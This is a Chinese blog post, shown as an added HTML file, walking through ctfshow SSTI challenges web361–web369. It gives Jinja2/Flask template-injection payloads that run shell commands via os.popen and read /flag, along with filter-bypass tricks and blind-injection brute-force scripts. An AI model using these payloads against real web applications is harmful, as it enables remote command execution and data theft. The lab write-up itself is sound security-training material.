@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web361-web372SSTI篇</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/09/17 17:32:25</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <p>本文中所有{ {、{ %，其余同理中本来应该没有空格，但是由于与Nunjunks语法碰撞，因此修改。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p>
+</blockquote>
+<h1 id=""><a href="#" class="headerlink" title=""></a><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690099738699-84cc7144-2cf6-458f-9d0b-4c39ad5e29f5.png" alt="image.png"></h1><p>代码块：</p>
+<pre class="language-python" data-language="python"><code class="language-python">变量块 &#123; &#123;&#125; &#125;	用于将表达式打印到模板输出
+注释块 &#123;##&#125;	注释
+控制块	&#123; %% &#125;	可以声明变量，也可以执行语句
+行声明	##		可以有和&#123; %% &#125;相同的效果</code></pre>
+<p>常用方法：</p>
+<pre class="language-python" data-language="python"><code class="language-python">__class__           查看对象所在的类
+__mro__             查看继承关系和调用顺序，返回元组
+__base__            返回基类
+__bases__           返回基类元组
+__subclasses__()    返回子类列表
+__init__            调用初始化函数，可以用来跳到__globals__
+__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典
+__builtins__        返回内建内建名称空间字典
+__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
+__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx&#x2F;a.xxx()）		都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
+__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
+__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
+__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
+__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
+url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app
+get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app
+lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123; &#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125; &#125;
+&#123; &#123;cycler.__init__.__globals__.os.popen(&#39;ls&#39;).read()&#125; &#125;
+current_app          应用上下文，一个全局变量
+request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc\self\fd&#x2F;3&#39;).read()
+request.args.x1   	 get传参
+request.values.x1 	 所有参数
+request.cookies      cookies参数
+request.headers      请求头参数
+request.form.x1   	 post传参	(Content-Type:applicaation&#x2F;x-www-form-urlencoded或multipart&#x2F;form-data)
+request.data  		 post传参	(Content-Type:a&#x2F;b)
+request.json		 post传json  (Content-Type: application&#x2F;json)
+config               当前application的所有配置。此外，也可以这样&#123; &#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() &#125; &#125;</code></pre>
+<p>过滤器：</p>
+<pre class="language-python" data-language="python"><code class="language-python">int()		将值转换为int类型；
+
+float()		将值转换为float类型；
+
+lower()		将字符串转换为小写；
+
+upper()		将字符串转换为大写；
+
+title()		把值中的每个单词的首字母都转成大写；
+
+capitalize()	把变量值的首字母转成大写，其余字母转小写；
+
+trim()		截取字符串前面和后面的空白字符；
+
+wordcount()	计算一个长字符串中单词的个数；
+
+reverse()	字符串反转；
+
+replace(value,old,new)	替换将old替换为new的字符串；
+
+truncate(value,length&#x3D;255,killwords&#x3D;False)	截取length长度的字符串；
+
+striptags()	删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
+
+escape()或e	转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。
+
+safe()		禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123; &#123;&#39;&lt;em&gt;hello&lt;&#x2F;em&gt;&#39;|safe&#125; &#125;；
+
+list()		将变量列成列表；
+
+string()	将变量转换成字符串；
+
+join()		将一个序列中的参数值拼接成字符串。示例看上面payload；
+
+abs()		返回一个数值的绝对值；
+
+first()		返回一个序列的第一个元素；
+
+last()		返回一个序列的最后一个元素；
+
+format(value,arags,*kwargs)	格式化字符串。比如：&#123; &#123;&quot;%s&quot; - &quot;%s&quot;|format(&#39;Hello?&#39;,&quot;Foo!&quot;) &#125; &#125;将输出：Helloo? - Foo!
+
+length()	返回一个序列或者字典的长度；
+
+sum()		返回列表内数值的和；
+
+sort()		返回排序后的列表；
+
+default(value,default_value,boolean&#x3D;false)	如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean&#x3D;False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean&#x3D;true。也可以使用or来替换。
+
+length()	返回字符串的长度，别名是count
+</code></pre>
+<p><strong>注入思路：</strong></p>
+<pre class="language-python" data-language="python"><code class="language-python">1.随便找一个内置类对象用__class__拿到他所对应的类
+2.用__bases__拿到基类（&lt;class &#39;object&#39;&gt;）
+3.用__subclasses__()拿到子类列表
+4.在子类列表中直接寻找可以利用的类getshell
+
+对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数
+</code></pre>
+<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p>名字就是考点，传入name尝试。<br>根据上图，推测可能是twig和Jinja2.<br>直接上payload：<br>可以用Lipsum：</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;tac &#x2F;flag&#39;).read()&#125; &#125;</code></pre>
+<p>cycler:</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;cycler.__init__.__globals__.os.popen(&#39;tac &#x2F;flag&#39;).read()&#125; &#125;</code></pre>
+<p>控制块：</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; % print(url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat ..&#x2F;flag&#39;).read()&quot;))% &#125;</code></pre>
+<p>或者用subclasses一点点扫也行，这里没必要。但这里写一下：<br>土方法：</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123; %27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;tac ..&#x2F;flag&#39;).read()&#125; &#125;
+
+# 这种方法的缺点在于需要找到 类 的索引</code></pre>
+<p>当然也可以直接使用splmap硬扫，指令如下。<br>注意，这个脚本需要使用python2使用，而且后面的指令都没有加上，要注意，如果你想使用该脚本可以按照如 下指令：</p>
+<pre class="language-python" data-language="python"><code class="language-python">python2 .&#x2F;splmap.py -u &#39;目标地址&#39; --os-shell</code></pre>
+<p>注意这里需要到达该文件根目录。<br>然后就自动进入命令行就可以查看文件了。</p>
+<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;tac &#x2F;flag&#39;).read()&#125; &#125;</code></pre>
+<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><h3 id="过滤单双引号"><a href="#过滤单双引号" class="headerlink" title="过滤单双引号"></a>过滤单双引号</h3><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__[request.args.a].popen(request.args.b).read()&#125; &#125;&amp;a&#x3D;os&amp;b&#x3D;tac &#x2F;flag</code></pre>
+<p>除此之外：<br>拼接：</p>
+<pre class="language-python" data-language="python"><code class="language-python">(config.__str__()[2])
+(config.__str__()[42])	
+
+?name&#x3D;&#123; &#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125; &#125;
+等于
+?name&#x3D;&#123; &#123;url_for.__globals__[&#39;os&#39;]&#125; &#125;
+</code></pre>
+<p>chr拼接</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; % set chr&#x3D;url_for.__globals__.__builtins__.chr % &#125;&#123; % print  url_for.__globals__[chr(111)%2bchr(115)]% &#125;</code></pre>
+<p>过滤器拼接：</p>
+<pre class="language-python" data-language="python"><code class="language-python">(()|select|string)[24]</code></pre>
+<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><h3 id="过滤args"><a href="#过滤args" class="headerlink" title="过滤args"></a>过滤args</h3><p>可以使用<code>values</code>获取所有参数，来绕过args，当然cookie也行，注意cookie分割是分号</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__[request.cookies.a].popen(request.cookies.b).read()&#125; &#125;
+Cookie：a&#x3D;os;b&#x3D;tac &#x2F;flag</code></pre>
+<p>或者</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__.os.popen(request.values.a).read()&#125; &#125;&amp;a&#x3D;cat &#x2F;flag</code></pre>
+
+<blockquote>
+<p>相关wp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
+</blockquote>
+<h2 id="字符串变量变量绕过方法"><a href="#字符串变量变量绕过方法" class="headerlink" title="字符串变量变量绕过方法"></a>字符串变量变量绕过方法</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p>
+</blockquote>
+<p>拼接：</p>
+<pre class="language-python" data-language="python"><code class="language-python">&quot;cla&quot;+&quot;ss&quot;</code></pre>
+<p>反转：</p>
+<pre class="language-python" data-language="python"><code class="language-python">&quot;__ssalc__&quot;[::-1]</code></pre>
+<p><em>在jinjia2里面，“cla””ss”是等同于”class”的，也就是说我们可以这样引用class，并且绕过字符串过滤</em></p>
+<pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
+&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)
+&quot;&quot;[&quot;__ssalc__&quot;][::-1]
+&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])
+</code></pre>
+<p>ascii转换</p>
+<pre class="language-python" data-language="python"><code class="language-python">&quot;&#123;0:c&#125;&quot;.format(97)&#x3D;&#39;a&#39;
+&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)&#x3D;&#39;__class__&#39;</code></pre>
+<p>编码绕过</p>
+<pre class="language-python" data-language="python"><code class="language-python">&quot;__class__&quot;&#x3D;&#x3D;&quot;\x5f\x5fclass\x5f\x5f&quot;&#x3D;&#x3D;&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
+对于python2的话，还可以利用base64进行绕过
+&quot;__class__&quot;&#x3D;&#x3D;(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>
+<p>chr函数</p>
+<pre class="language-python" data-language="python"><code class="language-python">&#123; % set chr&#x3D;url_for.__globals__[&#39;__builtins__&#39;].chr % &#125;
+&#123; &#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125; &#125;</code></pre>
+<p>在jinja2里面可以利用~进行拼接</p>
+<pre class="language-python" data-language="python"><code class="language-python">&#123; %set a&#x3D;&#39;__cla&#39; % &#125;&#123; %set b&#x3D;&#39;ss__&#39;% &#125;&#123; &#123;&quot;&quot;[a~b]&#125; &#125;
+</code></pre>
+<p>大小写转换</p>
+<pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;[&quot;__CLASS__&quot;.lower()]
+</code></pre>
+<p>过滤器：</p>
+<pre class="language-python" data-language="python"><code class="language-python">(&#39;__clas&#39;,&#39;s__&#39;)|join
+[&quot;__CLASS__&quot;|lower
+&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 
+&quot;__ssalc__&quot;|reverse
+&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)
+
+
+(()|select|string)[24]~
+(()|select|string)[24]~
+(()|select|string)[15]~
+(()|select|string)[20]~
+(()|select|string)[6]~
+(()|select|string)[18]~
+(()|select|string)[18]~
+(()|select|string)[24]~
+(()|select|string)[24]
+
+dict(__clas&#x3D;a,s__&#x3D;b)|join
+</code></pre>
+<p>获取键值或者下标</p>
+<pre class="language-python" data-language="python"><code class="language-python">dict[&#39;__builtins__&#39;]
+dict.__getitem__(&#39;__builtins__&#39;)
+dict.pop(&#39;__builtins__&#39;)
+dict.get(&#39;__builtins__&#39;)
+dict.setdefault(&#39;__builtins__&#39;)
+list[0]
+list.__getitem__(0)
+list.pop(0)</code></pre>
+<p>获取属性</p>
+<pre class="language-python" data-language="python"><code class="language-python">().__class__
+()[&quot;__class__&quot;]
+()|attr(&quot;__class__&quot;)
+().__getattribute__(&quot;__class__&quot;)</code></pre>
+<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>上题的value可以用</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum.__globals__.os.popen(request.values.a).read()&#125; &#125;&amp;a&#x3D;cat &#x2F;flag</code></pre>
+<p>cookie也可以</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125; &#125;
+Cookie:c&#x3D;cat &#x2F;flag</code></pre>
+<p>常规，用<code>__getitem__()</code>来代替[]<br>直接用<code>__getitem__(1)</code>代替<code>[1]</code><br>或者直接构建任意字符：</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;config.__str__().__getitem__(22)&#125; &#125;   # 就是22</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python"># anthor:秀儿
+import requests
+url&#x3D;&quot;http:&#x2F;&#x2F;24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080&#x2F;?name&#x3D;&#123; &#123;config.__str__().__getitem__(%d)&#125; &#125;&quot;
+
+payload&#x3D;&quot;cat &#x2F;flag&quot;
+result&#x3D;&quot;&quot;
+for j in payload:
+    for i in range(0,1000):
+        r&#x3D;requests.get(url&#x3D;url%(i))
+        location&#x3D;r.text.find(&quot;&lt;h3&gt;&quot;)
+        word&#x3D;r.text[location+4:location+5]
+        if word&#x3D;&#x3D;j:
+            print(&quot;config.__str__().__getitem__(%d) &#x3D;&#x3D; %s&quot;%(i,j))
+            result+&#x3D;&quot;config.__str__().__getitem__(%d)~&quot;%(i)
+            break
+print(result[:len(result)-1])</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)
+).read()&#125; &#125;</code></pre>
+<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><p>用过滤器代替：<code>&#123; &#123;XXX|attr(request.args.AAA)|attr(reequest.args.BBB)&#125; &#125;</code><br>values</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.cmd)|attr(request.values.f)()&#125; &#125;&amp;cmd&#x3D;cat &#x2F;flag&amp;a&#x3D;__globals__&amp;b&#x3D;__getitem__&amp;c&#x3D;os&amp;d&#x3D;popen&amp;f&#x3D;read</code></pre>
+<p>cookie</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125; &#125;
+
+cookie:a&#x3D;__globals__;b&#x3D;cat &#x2F;flag</code></pre>
+<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><h2 id="过滤os"><a href="#过滤os" class="headerlink" title="过滤os"></a>过滤os</h2><p>但是也只是name过滤：</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125; &#125;&amp;a&#x3D;__globals__&amp;b&#x3D;os&amp;c&#x3D;cat &#x2F;flag</code></pre>
+<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤 { {"></a>过滤 <code>&#123; &#123;</code></h3><p>控制块代替<code>&#123; %</code></p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; %print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() % &#125;&amp;a&#x3D;__globals__&amp;b&#x3D;os&amp;c&#x3D;cat &#x2F;flag</code></pre>
+<p>盲注也可以：<br><code>open(&#39;/flag&#39;).read()</code>是回显整个文件，但是read函数里加上参数：<code>open(&#39;/flag&#39;).read(1)</code>，返回的就是读出所读的文件里的i个字符，以此类推，就可以盲注出了<br>测试payload：</p>
+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; &#123; % set a&#x3D;(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(1) % &#125; &#125;&#123; &#123; % if a&#x3D;&#x3D;request.values.d % &#125; &#125;H3llo&#123; &#123; % endif % &#125; &#125;
+&amp;a&#x3D;__globals__
+&amp;b&#x3D;__builtins__
+&amp;c&#x3D;&#x2F;flag
+&amp;d&#x3D;c</code></pre>
+<p>但是在脚本中就不用管两个前括号，但是测试payload里面必须要空。</p>
+<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
+&quot;&quot;&quot;
+@File    :   SSTI2.py   
+@Contact :   2997453446@qq.com
+@Blog    :   natro92.github.io
+ 
+@Modify Time      @Author    @Version    @Desciption
+------------      -------    --------    -----------
+2023&#x2F;7&#x2F;23 18:01   natro92      1.0        &#123; %% &#125;盲注
+&quot;&quot;&quot;
+import string
+
+import requests
+from tqdm import trange
+
+url &#x3D; &#39;http:&#x2F;&#x2F;eee5217c-c792-4517-883f-d6b38c2f5a58.challenge.ctf.show&#x2F;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+str &#x3D; &#39;_&#39; + string.printable
+
+for i in trange(9, 100):
+    for j in str:
+        params &#x3D; &#123;
+            &#39;name&#39;: &quot;&#123; &#123; % set a&#x3D;(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(&#123;&#125;) % &#125; &#125;&#123; &#123; % if a&#x3D;&#x3D;request.values.d % &#125; &#125;H3llo&#123; &#123; % endif % &#125; &#125;&quot;.format(i),
+            &#39;a&#39;: &quot;__globals__&quot;,
+            &#39;b&#39;: &quot;__builtins__&quot;,
+            &#39;c&#39;: &quot;&#x2F;flag&quot;,
+            &#39;d&#39;: f&#39;&#123;flag_pre + j&#125;&#39;
+        &#125;
+        r &#x3D; requests.get(url, params&#x3D;params)
+        if &#39;H3llo&#39; in r.text:
+            flag_pre +&#x3D; j
+            print(flag_pre)
+            break
+</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690107790825-13d6d576-602b-4867-8fec-3dbd5b48c04e.png" alt="image.png"></p>
+<h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><h3 id="过滤request"><a href="#过滤request" class="headerlink" title="过滤request"></a>过滤request</h3><p>直接开拼<br>下划线被 ban，<strong>str</strong>()不能用，需要用 string 过滤器得到 config 字符串：config|string，但是获得字符串后本来应该用中括号或者__getitem__()，但是问题是_被ban了，所以获取字符串中的某个字符比较困难，这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层.lower()方法，方便跑更多字符</p>
+<pre class="language-python" data-language="python"><code class="language-python">import string
+
+import requests
+
+url &#x3D; &#39;http:&#x2F;&#x2F;eee5217c-c792-4517-883f-d6b38c2f5a58.challenge.ctf.show&#x2F;?name&#x3D;&#123; &#123; % print (config|string|list).pop(&#123;&#125;).lower() % &#125; &#125;&#39;
+flag_pre &#x3D; &#39;ctfshow&#123;&#39;
+str &#x3D; &#39;_&#39; + string.printable
+payload &#x3D; &#39;tac &#x2F;flag&#39;
+res &#x3D; &#39;&#39;
+
+for j in payload:
+    for i in range(0,1000):
+        r&#x3D;requests.get(url&#x3D;url.format(i))
+        location&#x3D;r.text.find(&quot;&lt;h3&gt;&quot;)
+        word&#x3D;r.text[location+4:location+5]
+        if word&#x3D;&#x3D;j.lower():
+            print(&quot;(config|string|list).pop(%d).lower() &#x3D;&#x3D; %s&quot;%(i,j))
+            res+&#x3D;&quot;(config|string|list).pop(%d).lower()~&quot;%(i)
+            break</code></pre>
+<p>payload：</p>
